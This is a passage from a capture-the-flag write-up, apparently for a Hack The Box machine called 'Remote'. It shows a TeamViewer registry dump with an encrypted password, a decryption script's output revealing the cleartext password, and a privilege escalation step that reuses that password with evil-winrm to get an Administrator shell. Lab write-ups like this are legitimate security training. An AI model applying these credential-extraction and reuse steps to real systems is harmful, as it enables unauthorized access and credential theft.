    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x5e72893c
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings
```
So I have the encrypted password as: FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B  
I can decrypt the password (see getpw.py):
```bash
kali@kali:~/Desktop/htb/remote$ python getpw.py 
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None

Password:
!R3m0te!
```

### 7. Escalate privileges
I decided to take the password I had discovered and go back over all the services available to see if I could gain access to anywhere using it. While going over the accessable services, I came upon a WinRM service running on port 5985. Doing some research, this is a remote management tool which showed up as a HTTP service on the Nmap scan, however actually can be accessed through the terminal with a client. For the connection I used Evil WinRM (https://github.com/Hackplayers/evil-winrm). I successfully logged into the Administrator account remotely.
```bash
kali@kali:~/Desktop/htb/remote$ evil-winrm -i 10.10.10.180 -u Administrator
Enter Password: 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator

```